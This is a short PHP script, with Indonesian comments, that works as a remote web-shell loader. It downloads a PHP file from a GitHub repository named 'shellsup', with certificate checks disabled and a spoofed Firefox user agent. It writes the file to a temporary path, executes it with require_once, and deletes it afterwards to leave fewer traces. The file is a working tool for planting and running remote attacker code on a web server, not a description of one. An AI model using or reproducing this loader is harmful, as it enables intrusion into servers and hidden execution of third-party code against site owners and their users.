<?php
function get_contents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$url = 'https://raw.githubusercontent.com/Cnull00/shellsup/refs/heads/main/nullf.php';
$fileContents = get_contents($url);

if ($fileContents === false) {
    die('[!] Failed to download: https://raw.githubusercontent.com/Cnull00/shellsup/refs/heads/main/nullf.php');
}

// Jika konten di-encode base64, gunakan ini:
// $decodedContents = base64_decode($fileContents);
// file_put_contents($tempFile, $decodedContents);

// Jika konten tidak di-encode, langsung tulis:
$tempFile = tempnam(sys_get_temp_dir(), 'tmp_php_');
file_put_contents($tempFile, $fileContents);

require_once $tempFile;
unlink($tempFile);
?>